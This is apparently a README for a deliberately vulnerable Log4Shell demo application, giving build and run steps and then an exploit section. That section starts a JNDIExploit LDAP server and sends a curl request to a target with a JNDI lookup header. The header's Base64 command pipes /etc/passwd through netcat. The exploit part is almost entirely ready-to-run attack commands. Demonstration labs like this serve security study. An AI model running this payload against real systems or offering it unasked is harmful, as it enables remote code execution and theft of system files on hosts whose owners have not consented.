# log4shell example

## Requrements:

- java 8

## Build

    ./gradlew clean build

## Run

    java -jar build/lib/log4shell-0.0.1.jar

## Exploit
> run with **java 8**

- start LDAP listener  
    `java-se-8u41-ri/bin/java -jar JNDIExploit-1.2-SNAPSHOT.jar -i $MY_IP -p 8888`

- run exploit  
    `curl -X POST $TARGET_IP:8080/api/7678-IUFHG-9087-KJLJLJ -H '7987-LKJKF-9080-IUUZU-9876: ${jndi:ldap://$MY_IP:1389/Basic/Command/Base64/bmMgMTI3LjAuMC4xIDQwNDAgPCAvZXRjL3Bhc3N3ZAo=}'`